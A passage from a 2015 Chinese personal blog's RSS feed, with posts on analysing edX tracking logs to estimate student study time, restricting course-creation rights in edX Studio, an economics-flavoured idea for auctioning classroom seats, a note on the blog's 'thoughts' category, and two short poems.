&lt;p&gt;最后SET FOREIGN_KEY_CHECKS=1&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 07 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-07:edx-data-migrate.html</guid><category>edx</category></item><item><title>基于tracking logs的数据分析</title><link>/edx-tracking-logs-data-research.html</link><description>&lt;p&gt;最近打算写edX数据相关的文章，这一块庞大繁杂，资料分散，近来在这块花了大量时间，收集了大量资料源码以及阅读了基本所有可读的文档，决定将其整理出来，目的有二：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整理一下自己的资料，不至于让数据成为坟墓，为下次深入留下线索，不至于重头开始&lt;/li&gt;
&lt;li&gt;也希望能帮助到后来的人，不会像我此前一般毫无头绪，备受煎熬&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还没想好怎么组织这些文档资料和心得，先从一个具体的需求入手好了。&lt;/p&gt;
&lt;h1&gt;任务描述&lt;/h1&gt;
&lt;p&gt;统计每个学生在每门课上的花费的学习时间&lt;/p&gt;
&lt;h1&gt;Tracking Logs&lt;/h1&gt;
&lt;p&gt;为了完成以上任务，首先想到了&lt;a href="http://edx.readthedocs.org/projects/devdata/en/latest/internal_data_formats/tracking_logs.html"&gt;Tracking Logs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这是个什么东西呢，文档中是这样介绍的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Events are emitted by the server, the browser, or the mobile device to capture information about interactions with the courseware and the Instructor Dashboard in the LMS, and are stored in JSON documents. In the data package, event data is delivered in a log file.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;就是说这是个日志文件，内容为json格式，记录着用户与平台交互时发生的特定事件，事件可能由浏览器/后台系统或是手机端触发。&lt;/p&gt;
&lt;p&gt;那么都有哪些行为会被记录呢？&lt;/p&gt;
&lt;p&gt;这是所有的&lt;a href="http://edx.readthedocs.org/projects/devdata/en/latest/internal_data_formats/event_list.html"&gt;事件列表&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中比较有趣的是学生观看视频的许多行为都被记录，比如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edx.video.loaded&lt;/li&gt;
&lt;li&gt;edx.video.paused&lt;/li&gt;
&lt;li&gt;edx.video.played&lt;/li&gt;
&lt;li&gt;edx.video.position.changed&lt;/li&gt;
&lt;li&gt;edx.video.stopped&lt;/li&gt;
&lt;li&gt;edx.video.transcript.hidden&lt;/li&gt;
&lt;li&gt;edx.video.transcript.shown&lt;/li&gt;
&lt;li&gt;and so on...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从这里可能挖掘出大量对改良教学本身有所助益的数据，好比学生反复回看某个视频段，那么团队可能发现这里也许讲解的不够清晰，更多有趣的行为分析，大家可以发挥想象，我觉得这也是edX最有趣的地方之一&lt;/p&gt;
&lt;p&gt;最后给一个日志例子，我们就结束对Tracking Logs的介绍&lt;/p&gt;
&lt;pre&gt;
{
    "username": "AAAAAAAAAA",
    "event_source": "server",
    "name": "edx.course.enrollment.deactivated",
    "referer": "http:\/\/localhost:8001\/container\/i4x:\/\/edX\/DemoX\/vertical\/69dedd38233a46fc89e4d7b5e8da1bf4?action=new",
    "accept_language": "en-US,en;q=0.8",
    "time": "2014-01-26T00:28:28.388782+00:00",
    "agent": "Mozilla\/5.0 (Windows NT 6.1; WOW64; Trident\/7.0; rv:11.0) like Gecko",
    "page": null
    "host": "courses.edx.org",
    "session": "a14j3ifhskngw0gfgn230g",
    "context": {
      "user_id": 9999999,
      "org_id": "edX",
      "course_id": "edX\/DemoX\/Demo_Course",
      "path": "\/change_enrollment",
    },
    "ip": "NN.NN.NNN.NNN",
    "event": {
      "course_id": "edX\/DemoX\/Demo_Course",
      "user_id": 9999999,
      "mode": "honor"
    },
    "event_type": "edx.course.enrollment.deactivated"
  }
&lt;/pre&gt;

&lt;p&gt;更多的信息大家可自行去看日志文件,在&lt;code&gt;/edx/var/log/tracking&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对tracking log结构有兴趣的同学可以查看edx admin中的&lt;code&gt;/admin/track/trackinglog/add/&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;既然&lt;a href="http://edx.readthedocs.org/projects/devdata/en/latest/internal_data_formats/tracking_logs.html"&gt;tracking_logs&lt;/a&gt;跟踪记录了学生的所有行为数据，那么我们就从这里入手。看看能否从中挖掘出每个学生在每一门课所花的时间。&lt;br /&gt;
那么接下去的工作自然就变成对日志文本的解读，了解每个数据项的含义，这部分的文档也都在&lt;a href="http://edx.readthedocs.org/projects/devdata/en/latest/internal_data_formats/tracking_logs.html#video-interaction-events"&gt;这里&lt;/a&gt;。此外我们知道，了解用户是否在线，sessions往往是关键。 &lt;br /&gt;
而后设计计算用户在线时长的算法，再往后使用splunk或是hadoop来计算。&lt;br /&gt;
此后我去edx社区发了个求助帖，看看社区的建议，大家回复也基本是从sessions入手，@Alexander的回复让我很是开心，他说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The million dollar question&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;哈哈，我也觉得这是件很有价值的数据挖掘工作，此外@Kristin女神提到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;and as far as I know there is no hearbeat event...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;她还提到些session的细节，诸如粒度只到半小时（没有心跳检测），她似乎对这块很了解，还提出记录鼠标移动点击页面之类的事件，以此作为心跳检测，这是个很有趣的思路，这种思路也可以用来防作弊用。有兴趣的同学可以进一步挖掘，或是自定义事件来观察用户行为。&lt;/p&gt;
&lt;h1&gt;just do it&lt;/h1&gt;
&lt;p&gt;而后我就开始阅读理解这些数据，和思考算法。&lt;br /&gt;
这个过程中，我也在github上搜索相关的项目，发现McGill大学也在做了&lt;a href="https://github.com/McGillX/edx_data_research"&gt;这方面的工作&lt;/a&gt;，McGill是edX用户，这是加拿大的一所顶级名校，被誉为“加拿大的哈佛”。&lt;br /&gt;
随后翻了他们的源码库，发现他们在数据分析这块，可能是除了edx核心源码库之外走的最远的了，而且更棒的是，他们的分析多是以脚本形式，耦合度很低。读了几个脚本，发现和我此前的思路基本一致，很容易理解，那么我们就跟着McGill做好啦！！&lt;br /&gt;
所有功劳归McGill！&lt;/p&gt;
&lt;h1&gt;步骤细节&lt;/h1&gt;
&lt;p&gt;建议数据分析在单独的机器上做，避免影响服务器性能&lt;/p&gt;
&lt;h2&gt;导出tracking logs&lt;/h2&gt;
&lt;p&gt;tracking Logs位于&lt;code&gt;/edx/var/log/tracking&lt;/code&gt;&lt;br /&gt;
使用rsync同步这些文件，好处是rsync效率很高，每次只同步新增的部分。&lt;/p&gt;
&lt;h2&gt;导入到mongo&lt;/h2&gt;
&lt;p&gt;使用以下脚本：&lt;a href="https://raw.githubusercontent.com/wwj718/edx_data_research/master/parsing/tracking_logs/load_tracking_logs_to_mongo.py"&gt;load_tracking_logs_to_mongo&lt;/a&gt;  将log加载到mongo里&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python load_tracking_logs_to_mongo.py db_name collection_name &amp;lt;path_to_directory&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当然也可以选择性地处理日志文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python load_tracking_logs_to_mongo.py db_name collection_name &amp;lt;path_to_file_1&amp;gt; &amp;lt;path_to_file_2&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此外还可以选择性地加载课程相关的日志，并且指定时间段。可参考&lt;a href="https://github.com/wwj718/edx_data_research/tree/master/parsing/tracking_logs"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以上是我从Mcgill大学fork的仓库，他们的&lt;a href="https://github.com/wwj718/edx_data_research/tree/master/reporting_scripts"&gt;reporting_scripts&lt;/a&gt;里有一个小bug,我修复了，顺便提了个pull request,好像上游仓库还没处理，所以大家可以先用我的&lt;/p&gt;
&lt;h2&gt;查看课程&lt;/h2&gt;
&lt;p&gt;现在可以在mongo里查下都有哪些课程&lt;br /&gt;
&lt;code&gt;db.tracking.distinct('context.course_id')&lt;/code&gt;&lt;br /&gt;
通过以上command可以得到log里的所有course_id&lt;/p&gt;
&lt;h2&gt;归并文档&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;db.tracking.aggregate([{$match :{ 'context.course_id' : 'your_course_id' }}, {$out : 'your_course_id'}])&lt;/code&gt;&lt;br /&gt;
以上指令根据你指定的course_id，归并文档成为一个collection。&lt;/p&gt;
&lt;h2&gt;统计用户在线时间&lt;/h2&gt;
&lt;p&gt;下载&lt;a href="https://raw.githubusercontent.com/wwj718/edx_data_research/master/reporting_scripts/session_info.py"&gt;session_info&lt;/a&gt;脚本，修改里边的参数（DATABASE_NAME和collection_name）&lt;br /&gt;
执行&lt;code&gt;python session_info.py&lt;/code&gt;，就可以得到所有用户这门课中每个session期间的在线时长，结果以一份csv报表(session_info.csv)呈现，
报表内容为&lt;code&gt;['Username', 'Session ID', 'Number of Events', 'Start Time', 'End Time', 'Time Spent']&lt;/code&gt;,&lt;/p&gt;
&lt;p&gt;如果需要统计同个用户在该课程下的花费的所有时长，只需要做个累加就行。使用pandas可能很方便~&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;以上只是一个可行方案，并没考虑效率，今天我翻了下我在5月4号发的帖子，@Alexander回复说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;we created that script to get an initial idea but found it a very poor proxy and not helpful.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我这才得知他便是McGill大学&lt;a href="https://github.com/McGillX/edx_data_research"&gt;edx_data_research&lt;/a&gt;项目的开发者。的确这只是个零时的不够优雅的解决方案。&lt;/p&gt;
&lt;p&gt;如果要生产环境使用，必须考虑效率问题，可能以下几个内容会被考虑到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用单独的计算资源，不要影响主服务器&lt;/li&gt;
&lt;li&gt;定时计划任务(cron)&lt;/li&gt;
&lt;li&gt;考虑并发&lt;/li&gt;
&lt;li&gt;使用hadoop或者spark&lt;/li&gt;
&lt;li&gt;将计算结果存回数据库&lt;/li&gt;
&lt;li&gt;新建一个页面向课程团队展示分析结果&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 06 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-06:edx-tracking-logs-data-research.html</guid><category>edx</category></item><item><title>占你妹</title><link>/zhan-ni-mei.html</link><description>&lt;p&gt;有没有觉得题目萌萌哒？！&lt;br /&gt;
有个找茬游戏叫“找你妹”，名字炫酷极了，学来一用。如果有同学使用本文的想法创建相关项目，可以考虑下这个项目名，你看一来就帮你解决了计算机领域两个最难问题之一的起名，简直贴心 ~ &lt;/p&gt;
&lt;p&gt;之所以叫&lt;code&gt;占你妹&lt;/code&gt;，是因为下边将讨论的是高校内普遍存在的占座问题。&lt;/p&gt;
&lt;h1&gt;经济学视角&lt;/h1&gt;
&lt;p&gt;早上在知乎看到一个关于占座问题的讨论，翻了下答案并没有什么出彩的，多是是发发牢骚或是陈词滥调。于是试着给出了一个经济学视角下的观点&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;先上结论，反对书本，水杯，贴纸条等使用象征物占座的行为。&lt;br /&gt;
使用此类物品占座只能体现占座者获得好座位的意愿，却无法体现他愿意为之付出的代价，由于缺乏成本约束，会造成大量的资源浪费，也就是我们看到的偌大教室，书本之外，空空如也，而真正想学习的同学，想借考前抱大腿顺便勾搭学霸的同学，却绕树三匝，无枝可依，简直令人扼腕!&lt;br /&gt;
那么如何把好座位这种稀缺资源分配到最需要它的人手中，屁股占座的确解决了激励问题，占座者付出了时间成本，也许能体现他需求的迫切程度。&lt;br /&gt;
但这不能体现他就比别人更需要。更好的方案是将座位识别为一种稀缺资源，竞价出售。好比每个学生学期初分配到200个座位币，而后可以使用这些座位币去竞购座位。这里有许多可扩展的的空间，学校可以依据自定的标准来分配座位币（经验数值）。激励机制的设定也很自由，好比根据进步情况予以奖励座位币，以表彰其占座学习的成效。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;哈哈你看出来了，以上的核心观点基本出《自私的皮球》，这本书我最近真是爱不释手，精彩到什么程度呢，这样说吧，喜欢赖床的我，最近每天5点半爬起来看啊摔，根本停不下来！&lt;/p&gt;
&lt;p&gt;我们可以预测，一些黄金位置可能会争夺激烈，好比冬天暖气旁的位置，或是无聊课堂的最后一排，又或是图书馆编号0718的座位上女神长发翩翩，技术宅们为争夺0717的位置一掷千金，以便等待女神电脑坏了能第一个冲上去说“让你不使用linux操作系统，活该”，大笑三声，绝尘而去。&lt;/p&gt;
&lt;p&gt;我们继续开脑洞，如何在技术上实现这个想法呢，万一你做出app，又有课程格子创始人那样出色的忽悠能力，拉来风投，出任CEO，迎娶白富美，喝酸奶不舔盖，简直指日可待啊&lt;/p&gt;
&lt;h1&gt;实现（草稿）&lt;/h1&gt;
&lt;h2&gt;公信力&lt;/h2&gt;
&lt;p&gt;问题是你说你花了10个座位币买了今晚8-10点的靠窗位置来自习，可位置上的小伙伴歪着头说，哥今晚要坐这里赏月，就不走，咋地！那你怎么办呢，如果你有8块腹肌当然没问题，世间之大不平，非剑不能削也。不过话说回来，你有8块腹肌不去勾搭妹子，来自习干嘛？！&lt;/p&gt;
&lt;p&gt;这里需要有人提供执行力，这种事需要学校的支持。&lt;/p&gt;
&lt;p&gt;资源的管理权，可以成立社团之类（学校委托）&lt;/p&gt;
&lt;h2&gt;扩大脑洞&lt;/h2&gt;
&lt;p&gt;图书馆也视为一个教室，甚至体育馆，篮球场之类也都可以纳入，学校所有公共资源的使用都可以纳入&lt;/p&gt;
&lt;h2&gt;激励机制&lt;/h2&gt;
&lt;p&gt;成绩进步 社区服务 兑换为座位币&lt;/p&gt;
&lt;p&gt;我们还可以进一步脑洞，设想基于座位的社交（此处应理解为勾搭!）&lt;/p&gt;
&lt;h1&gt;技术实现（草稿）&lt;/h1&gt;
&lt;h2&gt;思路&lt;/h2&gt;
&lt;p&gt;建模：识别出实体（名词），为之建立数据模型&lt;br /&gt;
用户，座位，教室。  &lt;br /&gt;
教室的状态：（时间段里）有课/闲置&lt;br /&gt;
座位属于教室。&lt;br /&gt;
学生可以占有座位，预定，竞购  &lt;/p&gt;
&lt;p&gt;实际上很像电影院买票选票应用。本质是一个交易系统。 商品为每个位置的使用时间 &lt;/p&gt;
&lt;h2&gt;后端&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;用户系统  &lt;/li&gt;
&lt;li&gt;资源管理系统  &lt;/li&gt;
&lt;li&gt;RESTful接口&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;移动端&lt;/h2&gt;
&lt;p&gt;快速开发，使用开源工具，html/js写移动应用，或是不必编程的工具实现 &lt;/p&gt;
&lt;h2&gt;迭代优化&lt;/h2&gt;
&lt;p&gt;查询，搜索之类的功能，附近座位之类&lt;/p&gt;
&lt;p&gt;api的可组合性&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 06 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-06:zhan-ni-mei.html</guid><category>thought</category></item><item><title>空想的意义</title><link>/_thoughts.html</link><description>&lt;blockquote&gt;
&lt;p&gt;你的问题主要是读书不多而想得太多.   --杨绛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;博客新增了一个分类叫「空想」，扯些有的没的。这些零碎的想法多数产生于路上看往来美女的间隙，洗澡没法带kindle之时，或是蹲坑而手机没流量之际。&lt;/p&gt;
&lt;p&gt;闲着蛋疼想得多。&lt;/p&gt;
&lt;p&gt;而后却发现此中竟有莫大乐趣。以至于时常会期待这种清闲得蛋疼的时光，胡思乱想，心驰天外，所以我上班现在都早起40分钟，一路走去。&lt;/p&gt;
&lt;p&gt;内容多是些我感兴趣的话题，大学期间对诗词/哲学/古文兴趣浓厚，而工作之后兴趣渐转向经济/社会/人性，当然对技术的喜欢一如既往。&lt;/p&gt;
&lt;p&gt;思考的内容多是浅尝辄止，大约可以归类到脑洞大开一类，当然如果遇到我熟悉一些的领域，我会写的细致些，包括可操作性。&lt;/p&gt;
&lt;p&gt;用杨绛先生上边说的这句话来形容这个栏目再恰当不过了。&lt;/p&gt;
&lt;p&gt;你看我自黑得这么果断，你都不忍心下手了是吧 :)&lt;/p&gt;
&lt;p&gt;那么为何还要增加这个分类呢，除了抖M找黑之外。&lt;/p&gt;
&lt;p&gt;简单粗暴的回答是我乐意，你咬我呀！&lt;/p&gt;
&lt;p&gt;拉爽了仇恨，说说我打的小算盘好了。有时我对某个话题感兴趣，却没有太多时间和精力深入这个领域，我只是对这个领域内的某个局部感兴趣。&lt;/p&gt;
&lt;p&gt;好比说我妹昨天抽奖中了个mini，我今天下载了那个软件，一用发现有bug，理论上可以无限次抽奖，然后我就不想抽奖了，我对这个bug本身也不太感兴趣，我的兴趣点是为何人们为解决这么典型而稳定的需求（抽象）都要自己造轮子，而造出的轮子歪歪扭扭，质量拙劣，这个时候不正是使用开源解决方案的最佳时机吗，毕竟在抽奖这个问题上，方案是高度一致可重用的，每个人都单枪匹马地去解决一次，同样的坑人们前赴后继的掉下去，是对资源多大的浪费啊。&lt;/p&gt;
&lt;p&gt;然后我google/github了一下，并没有找到很好的解决方案。我想对此感兴趣的也许并不只我一人，我把它写在这里，对这部分也感兴趣的你，随手给个链接，也许就是我苦苦寻找的呢，又或者你对此持不同观点，你就认为这种事应该独立解决，这是技术人员的尊严，那么拔剑吧，我们找个找个草坪，约上一架也未尝不是一件趣事。&lt;/p&gt;
&lt;p&gt;又或者我们都对此感兴趣，一起去github发起一个项目，也给后来者带来便利。&lt;/p&gt;
&lt;p&gt;又或是我的一些想法，起了抛砖引玉的作用，触发了你的灵感，并且你去实施了。好比我最近在空想这个分类里准备写用开放平台打造智慧校园以及用github的fork方式来写小说。你觉得这个想法有趣，你继续发挥，找到了商业模式，于是你勾搭了技术宅，拿到了风投，那么等你出任CEO迎娶白富美之际，如果能送我一箱酸奶就再好不过了，这样我喝酸奶就不舔瓶盖啦，想想就让人激动呢！&lt;/p&gt;
&lt;p&gt;工作前后陆续读完了 《把时间当做朋友》《暗时间》《别闹了，费曼先生》《自私的皮球》&lt;/p&gt;
&lt;p&gt;如果说这些书谈论的话题里，有什么相似的东西的话，我觉得其中之一是&lt;/p&gt;
&lt;p&gt;思考的乐趣&lt;/p&gt;
&lt;p&gt;我主要还是想记录下那些电光火石之际，自己那些有点意思的脑洞大开&lt;/p&gt;
&lt;p&gt;而后将其丢到博客上博君一笑:) , 万一你也像我一样不靠谱，喜欢胡思乱想，喜欢扯淡呢&lt;/p&gt;
&lt;p&gt;那我们喝上一杯咖啡，能扯上一个春天的下午也说不定，也许意见不合还能打起来呢，多让人期待&lt;/p&gt;
&lt;p&gt;just for fun&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 02 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-02:_thoughts.html</guid><category>thought</category></item><item><title>空想的意义</title><link>/my_thoughts.html</link><description>&lt;blockquote&gt;
&lt;p&gt;你的问题主要是读书不多而想得太多.   --杨绛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;博客新增了一个分类叫「空想」，扯些有的没的。这些零碎的想法多数产生于路上看往来美女的间隙，洗澡没法带kindle之时，或是蹲坑而手机没流量之际。&lt;/p&gt;
&lt;p&gt;闲着蛋疼想得多。&lt;/p&gt;
&lt;p&gt;而后却发现此中竟有莫大乐趣。以至于时常会期待这种清闲得蛋疼的时光，胡思乱想，心驰天外，所以我上班现在都早起40分钟，一路走去。&lt;/p&gt;
&lt;p&gt;内容多是些我感兴趣的话题，大学期间对诗词/哲学/古文兴趣浓厚，而工作之后兴趣渐转向经济/社会/人性，当然对技术的喜欢一如既往。&lt;/p&gt;
&lt;p&gt;思考的内容多是浅尝辄止，大约可以归类到脑洞大开一类，当然如果遇到我熟悉一些的领域，我会写的细致些，包括可操作性。&lt;/p&gt;
&lt;p&gt;用杨绛先生上边说的这句话来形容这个栏目再恰当不过了。&lt;/p&gt;
&lt;p&gt;你看我自黑得这么果断，你都不忍心下手了是吧 :)&lt;/p&gt;
&lt;p&gt;那么为何还要增加这个分类呢，除了抖M找黑之外。&lt;/p&gt;
&lt;p&gt;简单粗暴的回答是我乐意，你咬我呀！&lt;/p&gt;
&lt;p&gt;拉爽了仇恨，说说我打的小算盘好了。有时我对某个话题感兴趣，却没有太多时间和精力深入这个领域，我只是对这个领域内的某个局部感兴趣。&lt;/p&gt;
&lt;p&gt;好比说我妹昨天抽奖中了个mini，我今天下载了那个软件，一用发现有bug，理论上可以无限次抽奖，然后我就不想抽奖了，我对这个bug本身也不太感兴趣，我的兴趣点是为何人们为解决这么典型而稳定的需求（抽奖）都要自己造轮子，而造出的轮子歪歪扭扭，质量拙劣，这个时候不正是使用开源解决方案的最佳时机吗，毕竟在抽奖这个问题上，方案是高度一致可重用的，每个人都单枪匹马地去解决一次，同样的坑人们前赴后继的掉下去，是对资源多大的浪费啊。&lt;/p&gt;
&lt;p&gt;然后我google/github了一下，并没有找到很好的解决方案。我想对此感兴趣的也许并不只我一人，我把它写在这里，对这部分也感兴趣的你，随手给个链接，也许就是我苦苦寻找的呢，又或者你对此持不同观点，你就认为这种事应该独立解决，这是技术人员的尊严，那么拔剑吧，我们就找个草坪，约上一架也未尝不是一件趣事。&lt;/p&gt;
&lt;p&gt;又或者我们都对此感兴趣，一起去github发起一个项目，也给后来者带来便利。&lt;/p&gt;
&lt;p&gt;又或是我的一些想法，起了抛砖引玉的作用，触发了你的灵感，并且你去实施了。好比我最近在「空想」这个分类下准备写「用开放平台打造智慧校园」以及「用github的fork方式来写小说」。你觉得这些想法有趣，你继续发挥，找到了可行的商业模式，你勾搭了技术宅，拿到了风投，那么等你出任CEO迎娶白富美之际，如果能送我一箱酸奶就再好不过了，这样我喝酸奶就不舔瓶盖啦，想想就让人激动呢！&lt;/p&gt;
&lt;p&gt;工作前后陆续读完了 《把时间当做朋友》《暗时间》《别闹了，费曼先生》《自私的皮球》&lt;/p&gt;
&lt;p&gt;如果说这些书谈论的话题里，有什么相似的东西的话，我觉得其中之一是：思考的乐趣&lt;/p&gt;
&lt;p&gt;我主要还是想记录下那些电光火石之际，自己那些有点意思的脑洞大开&lt;/p&gt;
&lt;p&gt;而后将其丢到博客上博君一笑:) , 万一你也像我一样不靠谱，喜欢胡思乱想，喜欢扯淡呢&lt;/p&gt;
&lt;p&gt;那我们喝上一杯咖啡，能扯上一个春天的下午也说不定，也许意见不合还能打起来呢，多让人期待&lt;/p&gt;
&lt;p&gt;just for fun&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 02 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-02:my_thoughts.html</guid><category>thought</category></item><item><title>下雨天</title><link>/rainy-day.html</link><description>&lt;p&gt;&lt;img alt="xiayutian.jpg" src="img/xiayutian.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;窗外大雨 &lt;/p&gt;
&lt;p&gt;我拉过被子  &lt;/p&gt;
&lt;p&gt;滚了两圈  &lt;/p&gt;
&lt;p&gt;裹成了春卷  &lt;/p&gt;
&lt;p&gt;把自己当作早餐&lt;/p&gt;
&lt;p&gt;等待屋檐下避雨的时间  &lt;/p&gt;
&lt;p&gt;前来吞噬  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 02 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-02:rainy-day.html</guid><category>随笔</category></item><item><title>骑车</title><link>/qiche.html</link><description>&lt;p&gt;打油一首先&lt;/p&gt;
&lt;p&gt;何须加滤镜，&lt;br /&gt;
风景艳如书。&lt;br /&gt;
春分在耳后，&lt;br /&gt;
挑逗近轻浮。&lt;/p&gt;
&lt;p&gt;&lt;img alt="qiche" src="img/tuzhong/qiche.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 01 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-01:qiche.html</guid><category>途中</category></item><item><title>edX课程创建权限</title><link>/edx-ontrolling-course-creation-rights.html</link><description>&lt;p&gt;时常有人给我发邮件或是qq问如何控制课程创建权限。&lt;/p&gt;
&lt;p&gt;的确是个常见的需求。&lt;/p&gt;
&lt;h1&gt;起因&lt;/h1&gt;
&lt;p&gt;默认情况下，Studio的注册用户都可以创建课程，这种默认行为似乎并不是通常的使用场景，平台拥有者更倾向于做个审核，才允许用户发布课程&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;读wiki啊！！  &lt;/p&gt;
&lt;p&gt;对于折腾edX的新手而言，我觉得首要的工作就两点：&lt;br /&gt;
1.  让平台跑起来&lt;br /&gt;
2.  通读wiki(&lt;a href="https://github.com/edx/configuration/wiki"&gt;configuration wiki&lt;/a&gt;和&lt;a href="https://github.com/edx/edx-platform/wiki"&gt;edx-platform wiki&lt;/a&gt;) &lt;/p&gt;
&lt;p&gt;如果你通读了wiki，起步阶段的多数的问题其实都不成问题。&lt;/p&gt;
&lt;h1&gt;解决方案&lt;/h1&gt;
&lt;p&gt;据说现在流行送鸡汤必须赠勺，我就写下可操作的解决方案好了。&lt;br /&gt;
跟官方的教程基本一样，官方wiki里有几处不够清晰，我加了自己的理解，没有直接翻译，没有完全按照它们的做法，在本地测试可用，你想按照wiki里的做法，可以自行阅读文后英文wiki。或者跟我往下做也行，有问题给我发邮件 : ）&lt;/p&gt;
&lt;h1&gt;方法一&lt;/h1&gt;
&lt;h2&gt;一些概念&lt;/h2&gt;
&lt;p&gt;首先得区分django站点级别的is_staff和课程级别的course staff的区别，前者拥有站点内容编辑权限(好比登录admin)，而后者只是作为课程团队成员，拥有的编辑课程内容的权限，是application级别的   (不理解也没啥关系)&lt;/p&gt;
&lt;h2&gt;只允许被标记为is_staff的用户创建课程&lt;/h2&gt;
&lt;p&gt;经过以下设置，课程团队成员(course staff)依然可以编辑课程内容，而创建课程则需要被审核为is_staff的用户才可.这在逻辑上也好理解，只要平台认可的内部成员才有创建课程的权限&lt;br /&gt;
至于如何设置用户的is_staff为yes，则需要使用管理员账户登录到admin，更改auth表就行（/admin/auth/user）&lt;/p&gt;
&lt;h3&gt;禁止一般用户创建课程&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cd /edx/app/edxapp/edx-platform&lt;/code&gt;&lt;br /&gt;
更改 &lt;code&gt;edx-platform/cms/envs/common.py&lt;/code&gt; 
在FEATURES里添加&lt;code&gt;'DISABLE_COURSE_CREATION': True&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;将用户标记为is_staff&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;./manage.py lms set_staff emailaddress&lt;/code&gt; &lt;br /&gt;
以上是命令行版本，我更喜欢直接去admin里标记：使用超级账号登录到admin，然后进入auth用户表（/admin/auth/user），选择相应用户，勾选对应选项就行&lt;/p&gt;
&lt;h3&gt;设置联系邮箱&lt;/h3&gt;
&lt;p&gt;如否你做了以上设置，那么一般注册用户默认就没法创建课程，而他又确实想创建，他怎么请求你把他标记为is_staff？&lt;br /&gt;
&lt;code&gt;cd /edx/app/edxapp/edx-platform&lt;/code&gt;&lt;br /&gt;
更改 &lt;code&gt;edx-platform/cms/envs/common.py&lt;/code&gt; 
在FEATURES里添加&lt;code&gt;'STUDIO_REQUEST_EMAIL':YOUR_EMAIL_ADDRESS&lt;/code&gt;，这个邮箱将收到用户的请求&lt;/p&gt;
&lt;h2&gt;重启edxapp&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp:&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ps : birch版本有些不同，改为：&lt;code&gt;sudo /edx/bin/supervisorctl  restart edxapp:&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;方法二：&lt;/h1&gt;
&lt;p&gt;方法一感觉有些hack，以下这个方案来得似乎更优雅些&lt;/p&gt;
&lt;h2&gt;选择性地允许课程创建&lt;/h2&gt;
&lt;p&gt;已被标记为is_staff的用户，不受以下方法影响，永远可以创建课程&lt;/p&gt;
&lt;h2&gt;启用课程创建权限&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;cd /edx/app/edxapp/edx-platform&lt;/code&gt;&lt;br /&gt;
更改 &lt;code&gt;edx-platform/cms/envs/common.py&lt;/code&gt; 
在FEATURES里添加&lt;code&gt;'ENABLE_CREATOR_GROUP': True&lt;/code&gt;
需要注意的是,如果采用这个方案，方案一中提到的&lt;code&gt;DISABLE_COURSE_CREATION&lt;/code&gt;不应当为&lt;code&gt;True&lt;/code&gt;，因为&lt;code&gt;DISABLE_COURSE_CREATION&lt;/code&gt;的优先级更高&lt;/p&gt;
&lt;pre&gt;
cd /edx/app/edxapp/edx-platform
# 更新数据库
sudo -u www-data /edx/bin/python.edxapp ./manage.py cms syncdb --migrate --settings aws --migrate –noinput
# 重启edxapp， birch版本有些不同，改为：sudo /edx/bin/supervisorctl  restart edxapp: 
sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp: 
